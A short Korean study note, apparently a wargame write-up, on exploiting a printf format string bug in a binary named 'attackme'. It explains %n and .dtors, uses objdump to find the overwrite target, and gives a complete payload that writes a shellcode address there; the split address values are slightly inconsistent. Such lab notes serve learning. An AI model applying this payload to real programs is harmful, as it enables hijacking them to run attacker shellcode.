-fgets 입력이 79개고 버퍼는 80개니 딱봐도 BOF는 불가능하다.
-남은건 printf인데 아마 형식지정자나 포맷스트링의 오류가 있겠지

--구글링 : 여러방법이있었다.
--제갈링 : "%n!!"

--oh!

-근데 잘 모르겠다.


%n은 현재까지 출력된 문자의 수를 현재 esp에 저장되어 있는 값에 해당하는 메모리 주소에 저장해 준다고 한다.

dtors는 바이너리가 종료되기 직전에 호출되는 함수들의 리스트라고한다.

0xffffffff func1 func2 func3 0x00000000의 형태로 되어있고 시작-끝으로 되어있다.

./attackme
AAAA %x %x %x %x %x 를 통해 AAAA가 어디에 출력되는지 확인한다
->4번째에 출력
즉 %x %x %x %n을 하게되면 주소1에 현재 출력된 길이만큼의 값이 들어가게 된다는 것



%50c%n 처럼 원하는 숫자를 집어넣을수도있다.

그러면 ret주소에 원하는 쉘 코드를 쓸 수도있다.

쉘코드 환경변수의 주소: 0xbffff89e

ret주소에 0xffffffff만큼 크기를 넣지 못하므로 쉘코드의 주소를 2바이트씩 나누어저장, 0xbfff, 0xf89a

49151, 63646


ret 주소는.dtors로 알아낼 수 있다.

	objdump -h attackme | grep .dtors
	*/ 18 .dtors 00000000 08049594 08049594 00000594 2**2

ret주소는 08049594

+4인 위치에 쉘코드 주소를 덮어써준다.

AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%63606c%n%51041c%n 를 입력

END

//